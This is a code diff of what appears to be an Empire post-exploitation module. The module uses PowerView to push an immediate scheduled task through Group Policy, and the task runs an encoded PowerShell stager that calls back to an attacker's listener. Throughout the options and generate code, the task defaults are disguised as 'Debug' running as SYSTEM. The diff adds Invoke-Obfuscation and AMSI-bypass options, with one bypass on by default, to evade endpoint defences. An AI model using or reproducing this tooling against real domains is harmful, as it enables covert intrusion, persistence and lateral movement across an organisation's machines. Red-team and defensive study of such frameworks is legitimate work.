@@ -21,18 +21,18 @@ class Module(object):
 
             'Techniques': ['T1053'],
 
-            'Background' : True,
+            'Background': True,
 
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
+            'OutputExtension': None,
 
-            'OpsecSafe' : True,
-            
-            'Language' : 'powershell',
+            'NeedsAdmin': False,
 
-            'MinLanguageVersion' : '2',
-            
+            'OpsecSafe': True,
+
+            'Language': 'powershell',
+
+            'MinLanguageVersion': '2',
+
             'Comments': [
                 'https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/'
             ]
@@ -42,70 +42,90 @@ class Module(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Agent': {
+                'Description': 'Agent to run module on.',
+                'Required': True,
+                'Value': ''
             },
-            'TaskName' : {
-                'Description'   :   'Name for the schtask to create.',
-                'Required'      :   True,
-                'Value'         :   'Debug'
+            'TaskName': {
+                'Description': 'Name for the schtask to create.',
+                'Required': True,
+                'Value': 'Debug'
             },
-            'TaskDescription' : {
-                'Description'   :   'Name for the schtask to create.',
-                'Required'      :   False,
-                'Value'         :   'Debugging functionality.'
+            'TaskDescription': {
+                'Description': 'Name for the schtask to create.',
+                'Required': False,
+                'Value': 'Debugging functionality.'
             },
-            'TaskAuthor' : {
-                'Description'   :   'Name for the schtask to create.',
-                'Required'      :   True,
-                'Value'         :   'NT AUTHORITY\System'
+            'TaskAuthor': {
+                'Description': 'Name for the schtask to create.',
+                'Required': True,
+                'Value': 'NT AUTHORITY\System'
             },
-            'GPOname' : {
-                'Description'   :   'The GPO name to build the task for.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'GPOname': {
+                'Description': 'The GPO name to build the task for.',
+                'Required': False,
+                'Value': ''
             },
-            'GPODisplayName' : {
-                'Description'   :   'The GPO display name to build the task for.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'GPODisplayName': {
+                'Description': 'The GPO display name to build the task for.',
+                'Required': False,
+                'Value': ''
             },
-            'Domain' : {
-                'Description'   :   'The domain to query for the GPOs, defaults to the current domain.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'Domain': {
+                'Description': 'The domain to query for the GPOs, defaults to the current domain.',
+                'Required': False,
+                'Value': ''
             },
-            'DomainController' : {
-                'Description'   :   'Domain controller to reflect LDAP queries through.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'DomainController': {
+                'Description': 'Domain controller to reflect LDAP queries through.',
+                'Required': False,
+                'Value': ''
             },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to use.',
+                'Required': True,
+                'Value': ''
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Proxy': {
+                'Description': 'Proxy to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'ProxyCreds': {
+                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Remove' : {
-                'Description'   :   'Switch. Remove the immediate schtask.',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Remove': {
+                'Description': 'Switch. Remove the immediate schtask.',
+                'Required': False,
+                'Value': 'default'
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             }
         }
 
@@ -119,19 +139,17 @@ class Module(object):
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self, obfuscate=False, obfuscationCommand=""):
-
         # Set booleans to false by default
         Obfuscate = False
         AMSIBypass = False
         AMSIBypass2 = False
-        
-        moduleName = self.info["Name"]
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
+
+        module_name = self.info["Name"]
+        listener_name = self.options['Listener']['Value']
+        user_agent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
+        proxy_creds = self.options['ProxyCreds']['Value']
         if (self.options['Obfuscate']['Value']).lower() == 'true':
             Obfuscate = True
         ObfuscateCommand = self.options['ObfuscateCommand']['Value']
@@ -140,17 +158,20 @@ class Module(object):
         if (self.options['AMSIBypass2']['Value']).lower() == 'true':
             AMSIBypass2 = True
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
-            print(helpers.color("[!] Invalid listener: " + listenerName))
+            print(helpers.color("[!] Invalid listener: " + listener_name))
             return ""
 
         else:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
+            launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                               obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
+                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
+                                                               AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
 
-            command = "/c \""+launcher+"\""
+            command = "/c \"" + launcher + "\""
 
             if command == "":
                 return ""
@@ -158,23 +179,24 @@ class Module(object):
             else:
 
                 # read in the common powerview.ps1 module source code
-                moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
+                module_source = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
                 try:
-                    f = open(moduleSource, 'r')
+                    f = open(module_source, 'r')
                 except:
-                    print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+                    print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
                     return ""
 
-                moduleCode = f.read()
+                module_code = f.read()
                 f.close()
 
                 # get just the code needed for the specified function
-                script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
+                script = helpers.generate_dynamic_powershell_script(module_code, module_name)
 
-                script = moduleName + " -Command cmd -CommandArguments '"+command+"' -Force"
+                script = module_name + " -Command cmd -CommandArguments '" + command + "' -Force"
 
-                for option,values in self.options.items():
-                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname", "domain", "domaincontroller"]:
+                for option, values in self.options.items():
+                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname",
+                                          "domain", "domaincontroller"]:
                         if values['Value'] and values['Value'] != '':
                             if values['Value'].lower() == "true":
                                 # if we're just adding a switch
@@ -182,10 +204,11 @@ class Module(object):
                             else:
                                 script += " -" + str(option) + " '" + str(values['Value']) + "'"
 
-                script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+                script += ' | Out-String | %{$_ + \"`n\"};"`n' + str(module_name) + ' completed!"'
 
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
+                                       obfuscationCommand=obfuscationCommand)
         script = helpers.keyword_obfuscation(script)
 
         return script
